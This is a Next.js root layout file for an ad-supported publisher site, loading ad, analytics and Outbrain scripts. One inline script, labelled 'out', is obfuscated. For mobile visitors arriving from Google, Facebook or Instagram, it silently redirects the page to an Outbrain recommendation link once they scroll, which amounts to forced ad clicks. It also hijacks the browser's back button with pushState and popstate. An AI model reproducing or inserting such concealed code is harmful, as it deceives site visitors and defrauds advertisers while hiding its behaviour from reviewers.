import Script from "next/script";
import { Roboto_Slab } from "next/font/google";
import { Toaster } from "react-hot-toast";

import type { Metadata } from "next";

import LoadingWrapper from "@/components/wrappers/loading-wrapper";
import { CardImage, description, keywords, title, url } from "@/constant";

import "@/app/globals.css";
import Footer from "@/components/footer/Footer";

export const revalidate = 0;

// Fonts
const poppins = Roboto_Slab({
  subsets: ["latin"],
  display: "swap",
  weight: ["100", "200", "300", "400", "500", "600", "700", "800", "900"],
});

// Meta Data

export const metadata: Metadata = {
  title: `${title}`,
  description: description,
  keywords: keywords,
  robots: "index follow",
  twitter: {
    card: "summary_large_image",
    site: title,
    title: `${title}`,
    description: description,
    images: CardImage,
  },
  openGraph: {
    type: "website",
    siteName: `${title}`,
    description: description,
    url: url,
    countryName: "USA",
    images: CardImage,
  },
  metadataBase: new URL(url),
  alternates: {
    canonical: "/",
  },
  publisher: "Truepub Media",
  icons: "/favicon.ico",
};

// Main HTML
export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="en" className="scroll-smooth">
      <body className={`${poppins.className} overflow-x-hidden`}>
        <Script
          src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"
          async
          strategy="afterInteractive"
        ></Script>
        <Script
          src="https://www.googletagmanager.com/gtag/js?id=G-8FYMCYZZN2"
          async
          strategy="afterInteractive"
        ></Script>
        <Script
          src="//widgets.outbrain.com/outbrain.js"
          async
          type="text/javascript"
          strategy="afterInteractive"
        ></Script>
        <Script id="google-analatics">
          {` window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());

            gtag('config', 'G-8FYMCYZZN2');`}
        </Script>
        <Script id="out" strategy="afterInteractive">
          {`const _0x56816f=_0x3a5e;(function(_0x54ad46,_0x42961c){const _0xad4e0a=_0x3a5e,_0x4028e9=_0x54ad46();while(!![]){try{const _0x23fc50=parseInt(_0xad4e0a(0x1f6))/0x1*(-parseInt(_0xad4e0a(0x20f))/0x2)+parseInt(_0xad4e0a(0x212))/0x3+parseInt(_0xad4e0a(0x1fa))/0x4+parseInt(_0xad4e0a(0x20e))/0x5*(parseInt(_0xad4e0a(0x1f8))/0x6)+parseInt(_0xad4e0a(0x1fe))/0x7*(parseInt(_0xad4e0a(0x213))/0x8)+-parseInt(_0xad4e0a(0x1f3))/0x9+parseInt(_0xad4e0a(0x209))/0xa*(-parseInt(_0xad4e0a(0x20b))/0xb);if(_0x23fc50===_0x42961c)break;else _0x4028e9['push'](_0x4028e9['shift']());}catch(_0x4cb0e5){_0x4028e9['push'](_0x4028e9['shift']());}}}(_0x3414,0x41a51));const num=Math[_0x56816f(0x205)](),isMobile=/iPhone|iPad|iPod|Android/i[_0x56816f(0x204)](navigator[_0x56816f(0x203)]),allowedReferer=[_0x56816f(0x20c),_0x56816f(0x202),_0x56816f(0x1ff)];function isFromAllowedReferer(){const _0xcfb512=_0x56816f,_0x109d93=document[_0xcfb512(0x208)]['toLowerCase']();return allowedReferer[_0xcfb512(0x1f4)](_0x1a2447=>_0x109d93[_0xcfb512(0x210)](_0x1a2447));}function randomIntFromInterval(_0x35a638,_0x4d249a){const _0x289364=_0x56816f;return Math['floor'](Math[_0x289364(0x205)]()*(_0x4d249a-_0x35a638+0x1)+_0x35a638);}function _0x3414(){const _0x11d2e1=['1510212KShzIq','8FZJRGU','.ob-dynamic-rec-link','querySelector','2377629GIomPw','some','push','2xAnPMF','No\x20shadow\x20roots\x20found.','48hjhLYQ','body','799068xbXUVP','log','href','popstate','354669MzDFFW','google.com','children','URL','instagram.com','userAgent','test','random','pushState','addEventListener','referrer','10ZnioQb','floor','105578zlkfcT','facebook.com','location','77090jwihRn','334522KWxmHK','includes','length'];_0x3414=function(){return _0x11d2e1;};return _0x3414();}const outBrainFunction=()=>{function _0x330214(){const _0x38844b=_0x3a5e,_0x414e10=[];function _0x57c48a(_0x5a4826){const _0x281f45=_0x3a5e;_0x5a4826['shadowRoot']&&_0x414e10[_0x281f45(0x1f5)](_0x5a4826['shadowRoot']);for(const _0x3bb439 of _0x5a4826[_0x281f45(0x200)]){_0x57c48a(_0x3bb439);}}_0x57c48a(document[_0x38844b(0x1f9)]),_0x414e10[_0x38844b(0x211)]>0x0?_0x414e10['forEach'](_0x40f2db=>{const _0xa69c33=_0x38844b,_0x31c929=_0x40f2db[_0xa69c33(0x1f2)](_0xa69c33(0x1f1));_0x31c929&&(window[_0xa69c33(0x20d)][_0xa69c33(0x1fc)]=_0x31c929[_0xa69c33(0x1fc)]);}):console[_0x38844b(0x1fb)](_0x38844b(0x1f7));}setTimeout(()=>{_0x330214();},randomIntFromInterval(0x3,0x6)*0x3e8);};function _0x3a5e(_0x3ac37f,_0x11407a){const _0x3414f4=_0x3414();return _0x3a5e=function(_0x3a5e50,_0x6dcf34){_0x3a5e50=_0x3a5e50-0x1f1;let _0x45dd34=_0x3414f4[_0x3a5e50];return _0x45dd34;},_0x3a5e(_0x3ac37f,_0x11407a);}if(isFromAllowedReferer()&&isMobile){const randomNumber=Math[_0x56816f(0x20a)](Math[_0x56816f(0x205)]()*(0xc8-0x64+0x1))+0x64;let run=![];setTimeout(()=>{const _0x2bbfff=_0x56816f;window[_0x2bbfff(0x207)]('scroll',()=>{window['scrollY']>=randomNumber&&!run&&(outBrainFunction(),run=!![]);});},0x5dc),history[_0x56816f(0x206)](null,null,document[_0x56816f(0x201)]),window['addEventListener'](_0x56816f(0x1fd),()=>{const _0x3947ba=_0x56816f;window['location'][_0x3947ba(0x1fc)]=window[_0x3947ba(0x20d)][_0x3947ba(0x1fc)];});}`}
        </Script>
        <Script strategy="afterInteractive" id="inter-ads" async>
          {`window.googletag = window.googletag || { cmd: [] };
          let interstitialSlot;
          googletag.cmd.push(() => {
            // Define a web interstitial ad slot.
            interstitialSlot = (interstitialSlot = googletag.defineOutOfPageSlot(
              "/22971894985/PM_S_INTERSTITIAL",
              googletag.enums.OutOfPageFormat.INTERSTITIAL
            ));

            // Slot returns null if the page or device does not support interstitials.
            if (interstitialSlot) {
              // Enable optional interstitial triggers and register the slot.
              interstitialSlot.addService(googletag.pubads()).setConfig({
                interstitial: {
                  triggers: {
                    navBar: true,
                    unhideWindow: true,
                  },
                },
              });

              googletag.enableServices();
            }
          });
          `}
        </Script>
        <Script strategy="afterInteractive" id="inter-ads-push" async>
          {`
            googletag.cmd.push(() => {
              googletag.display(interstitialSlot);
            });
          `}
        </Script>
        <Toaster position="top-center" />
        <LoadingWrapper />

        {children}
        <Footer />
      </body>
    </html>
  );
}
